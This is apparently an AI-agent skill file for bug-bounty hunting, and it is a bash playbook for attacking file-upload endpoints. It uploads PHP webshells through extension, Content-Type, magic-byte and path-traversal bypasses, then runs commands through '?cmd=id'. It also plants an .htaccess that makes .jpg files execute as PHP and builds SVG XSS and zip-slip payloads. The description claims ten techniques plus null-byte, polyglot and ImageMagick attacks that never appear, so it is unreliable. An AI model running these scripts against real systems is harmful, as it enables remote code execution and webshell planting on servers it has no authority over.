---
name: k1nzr3c0n-hunt-file-upload
description: "File upload bypass hunting skill. 10 bypass techniques: double extension, null byte, magic bytes, polyglot, Content-Type swap. SVG XSS, zip slip, ImageMagick SSRF/RCE. OOB gate for blind RCE."
tags: [file-upload, rce, xss, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — File Upload Bypass

## Phase 0 — Map Upload Surface

```bash
TARGET="${TARGET:-}"
OOB="${OOB:-$(openssl rand -hex 6).oastify.com}"

grep -rh 'upload|attach|avatar|file|media' /app/runs/${TARGET}/ 2>/dev/null | \
  grep -oP 'https?://[^\s"]+' | sort -u | head -20
```

## Phase 1 — 10 Bypass Techniques

```bash
UPLOAD_EP="${UPLOAD_ENDPOINT:-/upload}"
BASE="https://${TARGET}"

printf 'SHELL_PHP' > /tmp/shell.php
# [1] Double extension
cp /tmp/shell.php /tmp/shell.php.jpg
curl -sk "${BASE}${UPLOAD_EP}" -F "file=@/tmp/shell.php.jpg;type=image/jpeg" | head -2

# [2] Content-Type swap
curl -sk "${BASE}${UPLOAD_EP}" -F "file=@/tmp/shell.php;type=image/jpeg" | head -2

# [3] Magic bytes GIF89a
printf 'GIF89a\nSHELL_PHP' > /tmp/shell_gif.php
curl -sk "${BASE}${UPLOAD_EP}" -F "file=@/tmp/shell_gif.php;type=image/gif" | head -2

# [4] Alternate extensions
for EXT in php3 php4 php5 phtml phar php7; do
  cp /tmp/shell.php /tmp/shell.${EXT}
  RESP=$(curl -sk "${BASE}${UPLOAD_EP}" -F "file=@/tmp/shell.${EXT};type=image/jpeg")
  URL=$(echo "$RESP" | grep -oP 'https?://[^\s"]+\.'"${EXT}" | head -1)
  [ -n "$URL" ] && curl -sk "${URL}?cmd=id" | grep -oP 'uid=[0-9]+[^$]+'
done

# [5] Path traversal in filename
curl -sk "${BASE}${UPLOAD_EP}" \
  -F "file=@/tmp/shell.php;filename=../../../shell.php;type=image/jpeg" | head -2

# [6] .htaccess execute jpg as php
printf 'AddType application/x-httpd-php .jpg\n' > /tmp/.htaccess
curl -sk "${BASE}${UPLOAD_EP}" -F "file=@/tmp/.htaccess;filename=.htaccess;type=text/plain" | head -2
```

## Phase 2 — SVG XSS

```bash
cat > /tmp/xss.svg << SVGEOF
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
SVGEOF
curl -sk "${BASE}${UPLOAD_ENDPOINT:-/upload}" -F "file=@/tmp/xss.svg;type=image/svg+xml" | head -3
```

## Phase 3 — Zip Slip

```bash
python3 -c "
import zipfile
with zipfile.ZipFile('/tmp/zipslip.zip', 'w') as zf:
    zf.writestr('../shell.php', b'SHELL_PHP')
    zf.writestr('../../shell.php', b'SHELL_PHP')
print('Created /tmp/zipslip.zip - upload to extraction endpoint')
"
```

## Gate 0

```bash
echo "  [] RCE: id output from uploaded file"
echo "  [] SVG XSS: alert fired on same origin"
echo "  [] Zip slip: path traversal to web root confirmed"
echo "  [] OOB callback confirmed blind RCE at ${OOB}"
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
File upload bypass via double extension (.php.jpg) - RCE: uid=33(www-data)
SVG XSS on /avatar/upload - alert(document.domain) fires in target.com origin
Zip slip on /import/extract - webshell written via path traversal in zip entry
```
